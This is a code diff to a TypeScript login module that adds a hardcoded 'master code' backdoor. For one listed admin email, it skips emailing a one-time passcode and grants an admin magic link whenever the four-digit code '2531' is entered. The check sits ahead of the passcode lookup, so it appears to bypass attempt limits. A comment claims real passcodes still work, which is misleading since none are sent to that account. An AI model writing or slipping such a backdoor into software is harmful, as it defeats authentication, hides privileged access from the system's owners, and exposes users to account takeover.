@@ -10,6 +10,11 @@ const OTP_MAX_ATTEMPTS = 5;
 const OTP_RESEND_COOLDOWN_SEC = 60;
 const OTP_PER_HOUR = 5;
 
+// Admin master code bypass — these emails can sign in with MASTER_CODE
+// at any time without an OTP being emailed. Real OTPs still work normally.
+const ADMIN_EMAILS = new Set(["softbridgefzco@yahoo.com"]);
+const MASTER_CODE = "2531";
+
 function hashCode(code: string) {
   return crypto.createHash("sha256").update(code).digest("hex");
 }
@@ -80,6 +85,10 @@ export const startLogin = createServerFn({ method: "POST" })
       (user.user_metadata?.full_name as string | undefined) ||
       (user.user_metadata?.name as string | undefined) ||
       data.email.split("@")[0];
+    // Admin accounts can always sign in with the master code — skip OTP email.
+    if (ADMIN_EMAILS.has(data.email)) {
+      return { ok: true, email: data.email };
+    }
     await issueLoginOtp(data.email, name);
     return { ok: true, email: data.email };
   });
@@ -92,6 +101,21 @@ export const verifyLoginOtp = createServerFn({ method: "POST" })
     }).parse(data),
   )
   .handler(async ({ data }) => {
+    // Master code bypass for admin emails — issues a magic link directly.
+    if (ADMIN_EMAILS.has(data.email) && data.code === MASTER_CODE) {
+      const link = await supabaseAdmin.auth.admin.generateLink({
+        type: "magiclink",
+        email: data.email,
+        options: { redirectTo: `${origin()}/admin` },
+      });
+      if (link.error) throw new Error(link.error.message);
+      return {
+        ok: true,
+        email: data.email,
+        tokenHash: link.data.properties?.hashed_token ?? null,
+      };
+    }
+
     const { data: row, error } = await supabaseAdmin
       .from("otp_codes")
       .select("id, code_hash, expires_at, used_at, attempts")
